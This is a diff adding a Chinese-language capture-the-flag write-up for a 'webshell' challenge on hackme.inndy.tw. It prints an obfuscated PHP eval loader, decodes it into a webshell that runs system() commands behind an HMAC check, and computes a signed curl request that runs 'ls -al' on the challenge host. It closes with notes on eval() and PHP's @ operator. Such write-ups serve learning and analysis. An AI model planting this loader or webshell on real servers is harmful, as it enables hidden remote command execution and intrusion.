@@ -1,0 +1,98 @@
+View Page Source
+底部
+<?php $cation = "St\x72\x5fr\x4ft\x313";
+$e_obfus="b\x41Se\x364\x5f\x44e\x43ode";
+$e_cod = "g\x5ainfl\x41t\x45" ; $sourc =
+"St\x72\x72\x45v"; @eval ($sourc($e_cod(
+$e_obfus($cation("KMSqn8VjTVKi9lgrcMtH3V
+qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS
+H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I
+qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM
+nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx
+/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx
+cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX
+sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00
+TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe
+A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi
+STW8OO9t13k2/7r+He8BfU")))));
+==========================================================
+php -r '''$cation = "St\x72\x5fr\x4ft\x313";
+$e_obfus="b\x41Se\x364\x5f\x44e\x43ode";
+$e_cod = "g\x5ainfl\x41t\x45" ; $sourc =
+"St\x72\x72\x45v"; echo ($sourc($e_cod(
+$e_obfus($cation("KMSqn8VjTVKi9lgrcMtH3V
+qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS
+H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I
+qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM
+nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx
+/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx
+cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX
+sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00
+TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe
+A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi
+STW8OO9t13k2/7r+He8BfU")))));'''
+得到eval 执行的代码shell.php
+==========================================================
+function run() {
+	if(isset($_GET['cmd']) && isset($_GET['sig'])) {
+		$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
+		$key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
+		$sig = hash_hmac('SHA512', $cmd, $key);
+		if($sig === (string)$_GET['sig']) {
+			header('Content-Type: text/plain');
+			return !!system($cmd);
+		}
+	}
+	return false;
+}
+
+
+分析代码
+$_GET['cmd']=hash('SHA512', $_SERVER['REMOTE_ADDR'])^$cmd
+$key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
+$_GET['sig'] = hash_hmac('SHA512', $cmd, $key);
+==========================================================
+$_SERVER['REMOTE_ADDR'] 访问服务器的地址（自己的IP地址）
+$_SERVER['HTTP_USER_AGENT'],$_SERVER['HTTP_HOST'] 在header里
+
+
+php -r '''$key = "user-agent".sha1("webshell.hackme.inndy.tw");
+$cmd="ls -al";
+$sig = hash_hmac("SHA512", $cmd, $key);
+$cmdinput=$cmd^hash("SHA512", "183.93.146.46");
+echo "cmd=".urlencode($cmdinput)."&sig="."$sig";'''
+
+cmd=ZE%10%1A%05Y&sig=57b20c320af744db3e755767e15f2c919c460125f175790904905138ab697c2188e5ec1805123130ae084fdb638dda83c2b62c5812dce4f3c5313cb50b920341
+
+
+curl 'https://webshell.hackme.inndy.tw/?cmd=ZE%10%1A%05Y&sig=57b20c320af744db3e755767e15f2c919c460125f175790904905138ab697c2188e5ec1805123130ae084fdb638dda83c2b62c5812dce4f3c5313cb50b920341' --header 'User-Agent: user-agent'
+==========================================================
+PHP eval() 函数:
+eval(phpcode)
+
+eval() 函数把字符串按照 PHP 代码来计算。
+该字符串必须是合法的 PHP 代码，且必须以分号结尾。
+如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。
+
+example:
+<?php
+$string = "beautiful";
+$time = "winter";
+
+$str = 'This is a $string $time morning!';
+echo $str. "<br />";
+
+eval("\$str = \"$str\";");
+echo $str;
+?> 
+This is a $string $time morning!
+This is a beautiful winter morning! 
+
+/****************************************************************************************************/
+PHP 支持一个错误控制运算符：@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。 
+    Note: @ 运算符只对表达式有效。对新手来说一个简单的规则就是：如果能从某处得到值，就能在它前面加上 @ 运算符。例如，可以把它放在变量，函数和 include 调用，常量，等等之前。不能把它放在函数或类的定义之前，也不能用于条件结构例如 if 和 foreach 等。 
+
+/****************************************************************************************************/
+
+
+
